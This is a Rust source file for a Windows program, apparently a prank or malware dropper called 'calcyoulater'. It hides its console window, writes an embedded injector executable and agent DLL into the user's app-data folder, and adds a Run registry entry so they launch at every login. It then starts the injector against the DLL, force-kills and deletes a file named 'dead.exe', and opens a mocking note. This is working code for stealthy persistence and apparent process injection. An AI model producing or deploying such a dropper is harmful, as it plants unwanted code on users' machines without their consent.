#![windows_subsystem = "windows"]

use directories::ProjectDirs;
use std::fs::create_dir_all;
use std::path::Path;
use std::process::Command;
use winreg::RegKey;
use winreg::enums::*;

const AGENT: &[u8; 526848] = include_bytes!("..\\..\\target\\release\\calcagent.dll");
const INJECT: &[u8; 709632] = include_bytes!("..\\..\\target\\release\\calcject.exe");

fn main() {
    let Some(proj_dirs) = ProjectDirs::from("fyi", "catnip", "calcyoulater") else {
        panic!("error getting project dir");
    };

    let datadir = proj_dirs.data_dir();
    let calcject = datadir.join("calcject.exe");
    let calcagent = datadir.join("calcagent.dll");
    create_dir_all(datadir).expect("error creating proj dir");
    std::fs::write(&calcagent, AGENT).expect("error writing agent");
    std::fs::write(&calcject, INJECT).expect("error writing calcject");

    let key = r#"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"#;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    dbg!(&disp);

    let calcject = calcject.to_str().unwrap();
    let calcagent = calcagent.to_str().unwrap();

    key.set_value(
        "calyoulater",
        &format!("\"{}\" \"{}\"", calcject, calcagent),
    )
    .unwrap();

    Command::new(calcject).arg(calcagent).spawn().unwrap();
    Command::new("cmd")
    .args([
        "/c", 
        "start", 
        "/min", 
        "", 
        "cmd", 
        "/c",
        "taskkill /im dead.exe /f > nul 2>&1 & del dead.exe & echo it seems you have found yourself in a deadend. maybe you can calc.exe yourself a way out of this like a true programmer > dead.txt & notepad.exe dead.txt"
    ])
    .spawn()
    .expect("Failed to execute command");
}
